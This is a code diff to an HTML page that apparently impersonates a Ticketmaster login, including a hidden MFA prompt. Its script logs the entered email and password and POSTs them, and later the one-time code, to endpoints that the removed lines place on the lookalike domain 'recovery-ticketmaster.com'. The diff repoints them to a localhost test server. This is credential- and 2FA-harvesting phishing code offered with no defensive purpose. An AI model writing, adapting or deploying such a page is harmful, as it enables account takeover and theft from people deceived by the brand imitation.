@@ -10,7 +10,7 @@
       http-equiv="origin-trial"
       content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"
     />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=1024">
 
     <style>
             #mfa-root { display: none; /* Hidden by default */
@@ -8084,7 +8084,7 @@
           console.log('clicked')
           console.log(email)
           console.log(password)
-          fetch('https://recovery-ticketmaster.com/login', {
+          fetch('http://localhost:5000/login', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json'
@@ -8163,7 +8163,7 @@
             const otpInput = document.getElementById('mfa-code-input-field5');
             const errorMessageElement = document.getElementById('otp-error-message');
 
-            fetch('https://recovery-ticketmaster.com/otp-validate', {
+            fetch('http://localhost:5000/otp-validate', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
